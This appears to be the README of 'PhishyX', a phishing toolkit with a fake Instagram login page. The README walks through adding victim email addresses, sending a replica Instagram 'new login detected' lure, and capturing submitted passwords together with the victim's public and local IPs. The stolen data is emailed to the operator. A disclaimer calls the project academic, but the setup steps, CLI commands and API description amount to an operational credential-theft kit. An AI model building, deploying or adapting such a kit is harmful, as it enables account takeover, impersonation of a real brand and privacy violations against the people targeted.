# PhishyX

> **For academic / security awareness research only.**

A phishing simulation toolkit with an Instagram-clone login page. When a victim submits credentials, the server:
1. Sends a **credential capture** email (hacker-style dark terminal layout)
2. Sends an **Instagram-style "new login detected"** notification to every configured alert recipient

---

## Project Structure

```
phishyx/
├── client/                        # React + Vite frontend (Instagram clone)
│   ├── assets/                    # Static images (logo, collage, etc.)
│   ├── src/
│   │   ├── api.ts                 # All API calls + client-side IP collection (WebRTC + ipify)
│   │   ├── App.tsx                # Login page UI + form logic
│   │   └── App.css                # Styles (Instagram dark theme)
│   └── vite.config.ts             # Dev server + /api proxy → localhost:3000
│
└── server/                        # Express + Node.js backend
    ├── phishyx.config.json        # Persisted alert recipient list (managed by CLI)
    ├── .env                       # SMTP credentials (never commit)
    ├── src/
    │   ├── server.ts              # Entry point — starts HTTP server
    │   ├── app.ts                 # Express app, CORS, routes
    │   │
    │   ├── cli/
    │   │   └── configure.ts       # Interactive CLI to manage alert recipients
    │   │
    │   ├── config/
    │   │   └── phishyx.config.ts  # Read/write phishyx.config.json
    │   │
    │   ├── controllers/
    │   │   ├── auth.controller.ts # Handles POST /api/auth/login
    │   │   └── mail.controller.ts # Handles POST /api/send-email
    │   │
    │   ├── routes/
    │   │   ├── auth.routes.ts
    │   │   └── mail.routes.ts
    │   │
    │   ├── services/
    │   │   └── mailer.service.ts  # Nodemailer transporter (singleton)
    │   │
    │   ├── templates/
    │   │   ├── credentials.template.ts   # Dark terminal credential capture email
    │   │   ├── login-alert.template.ts   # Instagram-style "new login" alert email
    │   │   └── email.template.ts         # Generic phishing lure email
    │   │
    │   └── utils/
    │       ├── ip.util.ts         # Extracts real IP from request headers
    │       ├── geo.util.ts        # Resolves city/country from IP via ip-api.com
    │       └── parse-ua.util.ts   # Parses OS + browser from User-Agent string
    └── tsconfig.json
```

---

## How It Works

```
┌─ Attacker ──────────────────────────────────────────────────────────────────┐
│                                                                              │
│  1. npm run configure add victim@gmail.com    ← add target email            │
│  2. npm run configure url http://localhost:5173 ← set phishing page URL     │
│  3. npm run configure send                    ← fire the lure email         │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
         │
         │  Victim receives Instagram "New login detected" email
         │  with "secure your account" link → http://localhost:5173
         ▼
[Victim] clicks link → lands on fake Instagram login page
         │
         │  fills email + password → clicks Log in
         │
         ├─ getPublicIp()   → https://api.ipify.org  (real WAN IP)
         ├─ getLocalIps()   → WebRTC ICE candidates   (LAN IP e.g. 192.168.x.x)
         │
         ▼
POST /api/auth/login  { email, password, publicIp, localIp }
         │
[Server] auth.controller.ts
         │
         ├─ parseUserAgent(ua)  → OS + browser name
         ├─ resolveGeo(ip)      → city + country  (ip-api.com)
         │
         ├─ sendMail() ──► credential capture email  → CAPTURE_TO (hardcoded)
         │                  (dark terminal layout: email, password, IPs, UA)
         │
         └─ responds 200  →  client shows "incorrect credentials" snackbar
```

---

## Setup

### 1. Configure SMTP (`server/.env`)

```env
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=you@gmail.com
SMTP_PASS=your_app_password
MAIL_FROM=you@gmail.com
```

> For Gmail, generate an **App Password** at myaccount.google.com → Security → 2-Step Verification → App passwords.

### 2. Install dependencies

```bash
# Server
cd server && npm install

# Client
cd ../client && npm install
```

### 3. Configure and fire the lure (CLI)

```bash
cd server

# Step 1 — add the victim's email address
npm run configure add victim@gmail.com

# Step 2 — set the phishing page URL (default: http://localhost:5173)
npm run configure url http://localhost:5173

# Step 3 — send the lure email NOW
npm run configure send
```

The victim receives an Instagram-style "new login detected" email.
The **"secure your account"** link inside it points to your phishing URL.
When they click it and enter their credentials, you receive a capture email.

### 4. Run

```bash
# Terminal 1 — server (http://localhost:3000)
cd server && npm run dev

# Terminal 2 — client (http://localhost:5173)
cd client && npm run dev
```

Open `http://localhost:5173`.

---

## API Endpoints

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/api/auth/login` | Captures credentials, sends both emails |
| `POST` | `/api/send-email` | Sends a generic phishing lure email |
| `GET`  | `/` | Health check |

### `POST /api/auth/login` body

```json
{
  "email": "victim@example.com",
  "password": "hunter2",
  "publicIp": "41.200.x.x",
  "localIp": "192.168.1.10"
}
```

---

## Emails Sent

### 1. Credential Capture (always sent to `CAPTURE_TO`)
Dark terminal-style layout showing email, password, public IP, local IP, user-agent, and timestamp.

### 2. Instagram Login Alert (sent to all `alertTo` recipients)
Pixel-accurate replica of the real Instagram "New login detected" email, including:
- Victim's username
- OS · Browser · City, Country
- IP address
- Date and time
- "Secure your account" link

---

## CLI Reference

Run from the `server/` directory:

```
npm run configure                       interactive menu
npm run configure list                  show recipients + current URL
npm run configure add <email>           add a lure recipient
npm run configure remove <email>        remove a recipient
npm run configure clear                 remove all recipients
npm run configure url <url>             set the phishing page URL
npm run configure send                  send lure email to all recipients NOW
```

The config is stored in `server/phishyx.config.json`:

```json
{
  "alertTo": [
    "you@example.com"
  ]
}
```

---

> This project is strictly for **academic and security awareness research**. Do not use against systems or individuals without explicit written consent.
> > **made by Sauzxa**
